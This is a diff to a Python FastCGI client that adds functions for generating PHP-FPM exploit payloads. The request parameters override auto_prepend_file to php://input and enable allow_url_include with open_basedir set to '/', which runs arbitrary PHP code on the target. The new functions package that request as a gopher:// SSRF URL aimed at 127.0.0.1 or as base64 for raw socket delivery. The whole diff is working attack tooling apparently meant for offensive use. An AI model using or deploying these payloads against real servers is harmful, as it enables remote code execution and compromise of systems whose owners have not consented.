@@ -1,6 +1,5 @@
 # -*- coding:utf-8 -*-
 import base64
-import socket
 import random
 import argparse
 import sys
@@ -204,6 +203,35 @@ class FastCGIClient:
         return "fastcgi connect host:{} port:{}".format(self.host, self.port)
 
 
+def generate_code_payload(host, port, phpcode):
+    client = FastCGIClient(host, port, 3, 0)
+    params = dict()
+    documentRoot = "/"
+    uri = "/var/www/html/index.php"  # TODO remove this
+    phpcode = "<?php " + phpcode + ";?>"
+    params = {
+        'GATEWAY_INTERFACE': 'FastCGI/1.0',
+        'REQUEST_METHOD': 'POST',
+        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
+        'SCRIPT_NAME': uri,
+        'QUERY_STRING': '',
+        'REQUEST_URI': uri,
+        'DOCUMENT_ROOT': documentRoot,
+        'SERVER_SOFTWARE': 'php/fcgiclient',
+        'REMOTE_ADDR': '127.0.0.1',
+        'REMOTE_PORT': '11451',
+        'SERVER_ADDR': '127.0.0.1',
+        'SERVER_PORT': '80',
+        'SERVER_NAME': "localhost",
+        'SERVER_PROTOCOL': 'HTTP/1.1',
+        'CONTENT_TYPE': 'application/text',
+        'CONTENT_LENGTH': "%d" % len(phpcode),
+        'PHP_VALUE': 'auto_prepend_file = php://input',
+        'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /'
+    }
+    return client.request(params, phpcode)
+
+
 def generate_raw_payload(host, port, extension_path):
     client = FastCGIClient(host, port, 3, 0)
     params = dict()
@@ -233,10 +261,24 @@ def generate_raw_payload(host, port, extension_path):
     return client.request(params, content)
 
 
+def generate_ssrf_code_payload(host, port, phpcode):
+    raw_payload = generate_code_payload(host, port, phpcode)
+    request_ssrf = urlparse.quote(raw_payload)
+    return "gopher://127.0.0.1:" + str(port) + "/_" + request_ssrf
+
+
 def generate_ssrf_payload(host, port, extension_path):
     raw_payload = generate_raw_payload(host, port, extension_path)
     request_ssrf = urlparse.quote(raw_payload)
     return "gopher://127.0.0.1:" + str(port) + "/_" + request_ssrf
+
+
+def generate_base64_socks_code_payload(host, port, phpcode, urlencode=False):
+    raw_payload = generate_code_payload(host, port, phpcode)
+    data = force_text(base64.b64encode(raw_payload))
+    if urlencode:
+        data = urlparse.quote(data)
+    return data
 
 
 def generate_base64_socks_payload(host, port, extension_path, urlencode=False):
